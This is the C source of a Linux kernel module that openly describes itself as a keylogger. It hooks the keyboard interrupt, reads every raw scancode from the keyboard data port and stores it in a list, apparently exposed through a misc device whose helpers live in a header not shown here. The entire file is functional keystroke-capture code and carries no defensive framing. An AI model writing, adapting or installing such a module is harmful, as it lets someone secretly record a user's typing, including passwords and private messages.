#include "./keyboard.h"

MODULE_AUTHOR("SegFault42 <SegFault42@protonmail.com>");
MODULE_DESCRIPTION("keylogger");
MODULE_LICENSE("GPL");

static irqreturn_t kbd2_isr(int irq, void *dev_id)
{
	unsigned char	scancode;

	scancode = inb(KBD_DATA_REG);
	add_tail(scancode);

	return IRQ_HANDLED;
}

static int __init kbd2_init(void)
{
	create_misc();
	return request_irq(KBD_IRQ, kbd2_isr, IRQF_SHARED, "kbd2", (void *)kbd2_isr);
}

static void __exit kbd2_exit(void)
{
	pr_info("Exit\n");
	free_lst();
	free_irq(KBD_IRQ, (void *)kbd2_isr);
	destroy_misc();
}

module_init(kbd2_init);
module_exit(kbd2_exit);
